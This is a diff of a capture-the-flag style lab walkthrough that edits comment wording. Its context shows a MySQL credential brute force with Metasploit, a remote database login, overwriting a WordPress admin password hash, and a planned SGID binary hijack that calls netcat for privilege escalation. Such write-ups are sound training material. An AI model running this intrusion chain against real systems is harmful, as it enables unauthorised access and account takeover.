@@ -18,7 +18,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 16.68 seconds
 ```
 // We found an ssh, http and mysql port, I will search the web first
-// Simply going to the website we can see it uses wordpress, so I will use wpscan to see if I find something 
+// Simply going to the website we can see it uses wordpress, so I will use wpscan to see if I find something interesting
 
 // Nothing, so I will try and crack my way into the sql database using msfconsole to bruteforce it
 ```
@@ -71,7 +71,7 @@ msf6 auxiliary(scanner/mysql/mysql_login) > run
 [-] 192.168.164.88:3306   - 192.168.164.88:3306 - LOGIN FAILED: root:password (Incorrect: Access denied for user 'root'@'192.168.45.5' (using password: YES)
 [+] 192.168.164.88:3306   - 192.168.164.88:3306 - Success: 'root:robert'
 ```
-// Now we got the password for the user "root" and will login to the mysql database
+// Now we got the password for the user "root" and will login to the mysql database remotely
 ```
 ┌──(root㉿kali)-[/home/astra]
 └─# mysql -h 192.168.164.88 -p
@@ -159,7 +159,7 @@ MariaDB [wordpress_db]> select * from wp_users;
 
 MariaDB [wordpress_db]> 
 ```
-// Now we changed the password for an md5 that I created with cmd5.org, the value is root123, so now I will try and login to the wordpress
+// Now we changed the password for an md5 hash that I generated with cmd5.org, the hash decrypted is equal to "root123", so now I will try and login to the wordpress
 
 
 ![wearein](https://user-images.githubusercontent.com/47869173/220795741-63f9515b-926a-43cd-a399-00223bb9944e.jpg)
@@ -322,7 +322,7 @@ Password: 645dc5a8871d2a4269d4cbe23f6ae103
 
 jose@midnight:/var/www/html/wordpress$ 
 ```
-// And now we get to escalate privileges, I run linpeas and I find that  SGID is showing /usr/bin/status, so I didn´t know what it was, I did a strings command and I found out that is a service for binary, so I thought of setting our own to call a netcat
+// And now we get to escalate privileges, I run linpeas and I find that SGID is showing /usr/bin/status, so I didn´t know what it was, I did a strings command and I found out that is a service for binary, so I thought of setting our own to call a netcat
 ```
 jose@midnight:/var/www/html/wordpress$ strings /usr/bin/status
 
